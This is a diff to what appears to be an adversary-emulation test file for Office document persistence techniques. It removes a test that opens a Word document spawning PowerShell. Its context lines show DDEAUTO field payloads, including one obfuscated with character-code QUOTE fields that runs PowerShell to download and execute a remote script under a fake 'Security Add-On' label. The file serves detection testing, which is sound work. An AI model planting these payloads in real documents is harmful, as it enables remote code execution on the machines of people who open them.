@@ -37,23 +37,3 @@ atomic_tests:
       9. DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe"
 
       10. DDEAUTO "C:\\Programs\\Microsoft\\Office\\MSWord\\..\\..\\..\\..\\windows\\system32\\{ QUOTE 87 105 110 100 111 119 115 80 111 119 101 114 83 104 101 108 108 }\\v1.0\\{ QUOTE 112 111 119 101 114 115 104 101 108 108 46 101 120 101 } -w 1 -nop { QUOTE 105 101 120 }(New-Object System.Net.WebClient).DownloadString('http://<server>/download.ps1'); # " "Microsoft Document Security Add-On"
-
-- name: Word spawned a command shell and used an IP address in the command line
-  description: |
-    Opens a word document that will run powershell and perform an nslookup on the IP 192.168.1.1 and a sleep command
-
-  supported_platforms:
-    - windows
-
-  input_arguments:
-    atomics_path:
-      description: path to atomics folder
-      type: path
-      default: ..\..\atomics
-
-  executor:
-    name: command_prompt
-    command: |
-      start #{atomics_path}\T1137\src\PowerShell_IP_Doc.doc
-
-  
